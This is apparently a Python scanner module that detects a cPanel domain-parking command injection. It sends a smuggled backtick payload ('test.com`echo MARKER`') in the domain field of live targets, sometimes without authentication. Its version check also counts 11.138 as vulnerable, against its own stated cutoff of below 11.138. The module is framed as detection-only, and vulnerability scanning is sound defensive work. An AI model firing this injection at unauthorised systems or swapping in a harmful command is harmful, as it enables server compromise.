# cve_modules/cpanel_park.py
"""
CVE-2026-65643 — cPanel Domain Parking Command Injection

Adaptasi dari PoC tc4dy jadi modul scanning untuk main.py.

SCOPE: DETECTION ONLY.
  Modul ini cek apakah target pakai cPanel versi rentan (< 11.138),
  endpoint domainpark accessible, dan (kalau kredensial dikasih) apakah
  command injection diterima via domain parking field.

  vulnerable=True HANYA kalau:
    - versi rentan terdeteksi, DAN
    - auth berhasil (kredensial valid), DAN
    - injection marker berhasil di-trigger (bukan exec command berbahaya)

  TIDAK ada:
    - brute-force default creds
    - upload webshell
    - reverse shell
    - ganti password / bikin user
    - cleanup logs

  Kalau versi rentan tapi nggak ada kredensial / auth gagal:
    -> vulnerable=False, reason="vulnerable_version_suspect_no_auth"
    (masuk kategori SUSPECT di main.py, bukan VULN)
"""

import base64
import random
import re
import time
import urllib.parse
from datetime import datetime
from typing import Optional

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ── metadata untuk main.py ──────────────────────────────────────────────

CVE_META = {
    "id": "CVE-2026-65643",
    "name": "cPanel domain parking command injection",
    "func": "check_cve_2026_65643",
    "kwargs": {},   # kredensial diisi manual kalau mau full check
    "priority": 55,
}


# ── konstanta ───────────────────────────────────────────────────────────

DEFAULT_TIMEOUT = 15
MARKER = "CVE65643_MARKER_" + "".join(
    random.choices("abcdefghij", k=6))

UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
]


# ── core ────────────────────────────────────────────────────────────────

def _mk_session(timeout):
    s = requests.Session()
    s.headers.update({
        "User-Agent": random.choice(UA_POOL),
        "Connection": "close",
    })
    s.verify = False
    s.request_timeout = timeout
    adapter = requests.adapters.HTTPAdapter(
        max_retries=1, pool_connections=10, pool_maxsize=10)
    s.mount("http://", adapter)
    s.mount("https://", adapter)
    return s


def _detect_version(s, base):
    """Return (version_str|None, vulnerable_bool|None)."""
    endpoints = [
        "/cpanelversion", "/version",
        "/cgi-sys/entropysearch.cgi", "/cgi-sys/defaultwebpage.cgi",
    ]
    for path in endpoints:
        try:
            r = s.get(base + path, timeout=s.request_timeout,
                      verify=False, allow_redirects=True)
        except requests.RequestException:
            continue
        if r.status_code != 200:
            continue
        text = r.text or ""
        m = re.search(r'cPanel[,\s]+([\d.]+)', text, re.I)
        if not m:
            m = re.search(r'(\d+\.\d+\.\d+\.\d+)', text)
        if not m:
            continue
        ver = m.group(1)
        parts = ver.split(".")
        if len(parts) >= 2:
            try:
                major = int(parts[0])
                minor = int(parts[1])
                # CVE-2026-65643: vulnerable kalau < 11.138
                if major == 11 and minor <= 138:
                    return ver, True
                return ver, False
            except ValueError:
                return ver, None
        return ver, None
    return None, None


def _try_login(s, base, user, password):
    """
    Login pakai kredensial yang dikasih. Return (ok, security_token, cookie).
    TIDAK brute-force — cuma pakai user/password yang dikasih.
    """
    if not user or not password:
        return False, "", ""

    login_url = base + "/login/"
    data = {"user": user, "pass": password, "login_only": "1"}
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    try:
        r = s.post(login_url, data=data, headers=headers,
                   timeout=s.request_timeout, verify=False,
                   allow_redirects=True)
    except requests.RequestException:
        return False, "", ""

    if r.status_code != 200:
        return False, "", ""

    token = ""
    cookie = ""
    m = re.search(r'/cpsess(\d{10})', r.text or "")
    if m:
        token = m.group(0)
    for c in s.cookies:
        if c.name == "cpsession":
            cookie = c.value
            break
    if token and cookie:
        return True, token, cookie
    return False, "", ""


def _obtain_token(s, base):
    """Fallback: dapat CSRF token dari homepage (tanpa login)."""
    try:
        r = s.get(base + "/", timeout=s.request_timeout, verify=False,
                  allow_redirects=True)
        if r.status_code == 200:
            m = re.search(r'/cpsess(\d{10})', r.text or "")
            if m:
                return m.group(0)
    except requests.RequestException:
        pass
    return ""


def _check_endpoints(s, base):
    """
    Cek endpoint domainpark accessible tanpa auth.
    Return list of accessible endpoint hints.
    """
    accessible = []
    # json-api/domain endpoint — POST minimal (dry-run)
    for path in ("/json-api/domain", "/json-api/cpanel",
                 "/cgi-sys/domainpark.cgi"):
        try:
            r = s.get(base + path, timeout=s.request_timeout,
                      verify=False, allow_redirects=False)
        except requests.RequestException:
            continue
        if r.status_code in (200, 401, 403, 405):
            accessible.append({"path": path, "status": r.status_code})
    return accessible


def _try_injection(s, base, token, cookie):
    """
    Coba inject MARKER via domain parking field.
    TIDAK eksekusi command berbahaya — cuma `echo MARKER`.

    Return (bool, detail).
    """
    if not token:
        return False, "no_security_token"

    headers = {
        "X-CPanel-Security-Token": token,
        "Content-Type": "application/json",
    }
    if cookie:
        headers["Cookie"] = f"cpsession={cookie}"

    # dry-run payload: echo marker ke stdout (bukan command destruktif)
    payload = f"test.com`echo {MARKER}`"
    json_data = {
        "domain": payload,
        "function": "park",
        "api.version": 1,
    }

    url = base + f"{token}/json-api/domain"
    try:
        r = s.post(url, json=json_data, headers=headers,
                   timeout=s.request_timeout, verify=False,
                   allow_redirects=False)
    except requests.RequestException as e:
        return False, f"request_error: {e}"

    if r.status_code != 200:
        return False, f"status_{r.status_code}"

    # sukses kalau response body ngandung marker (echo berhasil)
    # atau status result=1 (injection diterima, walau echo nggak keliatan)
    if MARKER in (r.text or ""):
        return True, "marker_echoed_in_response"

    try:
        data = r.json()
        result = data.get("result", [{}])
        if isinstance(result, list) and result \
                and result[0].get("status") == 1:
            return True, "park_function_accepted"
    except (ValueError, AttributeError):
        pass

    return False, "injection_not_confirmed"


def _normalize_base(raw):
    raw = (raw or "").strip().rstrip("/")
    if not raw.startswith(("http://", "https://")):
        raw = "https://" + raw
    return raw


# ── entry point ─────────────────────────────────────────────────────────

def check_cve_2026_65643(target_url: str,
                          timeout: int = DEFAULT_TIMEOUT,
                          username: str = "",
                          password: str = "",
                          port: int = 0,
                          dry_run: bool = True) -> dict:
    """
    Cek target terhadap CVE-2026-65643.

    Args:
        target_url : URL target (cPanel, biasanya port 2083/2082)
        timeout    : timeout HTTP (default 15s)
        username   : cPanel username (opsional; tanpa ini cuma detection)
        password   : cPanel password (opsional)
        port       : override port (opsional)
        dry_run    : True (default) — cuma echo marker, nggak exec command
                     False — sama, tapi bisa dipakai buat subquery ringan
                     (saat ini belum diimplementasi)

    Return:
        {
            "vulnerable": bool,
            "evidence":   str | None,
            "reason":     str,
            "version":    str | None,
            "endpoints":  list,
            "auth":       bool,
        }
    """
    base = _normalize_base(target_url)
    result = {
        "vulnerable": False, "evidence": None, "reason": "",
        "version": None, "endpoints": [], "auth": False,
    }

    # override port kalau dikasih
    if port:
        try:
            parsed = urllib.parse.urlsplit(base)
            host = parsed.hostname or ""
            if host:
                scheme = parsed.scheme or "https"
                path = parsed.path or ""
                base = f"{scheme}://{host}:{port}{path}"
        except Exception:
            pass

    s = _mk_session(timeout)

    # ── tahap 1: fingerprint versi ──────────────────────────────────
    ver, vuln_ver = _detect_version(s, base)
    result["version"] = ver

    if vuln_ver is False:
        result["reason"] = f"version_{ver}_patched"
        return result

    # ── tahap 2: cek endpoint accessible ────────────────────────────
    endpoints = _check_endpoints(s, base)
    result["endpoints"] = endpoints

    if not endpoints:
        if vuln_ver is True:
            result["reason"] = "vulnerable_version_suspect_no_endpoint"
        else:
            result["reason"] = "no_cpanel_endpoint_suspect"
        return result

    # ── tahap 3: kalau versi patched, stop ──────────────────────────
    if vuln_ver is False:
        result["reason"] = f"version_{ver}_patched"
        return result

    # versi unknown tapi endpoint ada -> suspect
    if vuln_ver is None and not (username and password):
        result["reason"] = "version_unknown_endpoint_present_suspect"
        result["evidence"] = (f"endpoints={len(endpoints)} accessible, "
                              f"version unknown, auth not provided")
        return result

    # ── tahap 4: kalau ada kredensial, coba auth ────────────────────
    token, cookie = "", ""
    if username and password:
        ok, token, cookie = _try_login(s, base, username, password)
        result["auth"] = ok
        if not ok:
            result["reason"] = "vulnerable_version_suspect_auth_failed"
            result["evidence"] = (f"version={ver or 'unknown'}, "
                                  f"endpoints={len(endpoints)}, "
                                  f"auth failed with provided creds")
            return result
    else:
        # coba tanpa auth dulu (fallback token dari homepage)
        token = _obtain_token(s, base)

    # ── tahap 5: coba injection (dry-run echo marker) ───────────────
    ok_inj, detail = _try_injection(s, base, token, cookie)
    if ok_inj:
        result["vulnerable"] = True
        result["evidence"] = (f"version={ver or 'unknown'}, "
                              f"injection confirmed ({detail})")
        result["reason"] = "command_injection_confirmed"
        return result

    # injection gagal
    if result["auth"]:
        result["reason"] = f"auth_ok_injection_failed ({detail})"
    else:
        result["reason"] = "vulnerable_version_suspect_injection_blocked"
        result["evidence"] = (f"version={ver or 'unknown'}, "
                              f"endpoints={len(endpoints)}, "
                              f"injection: {detail}")
    return result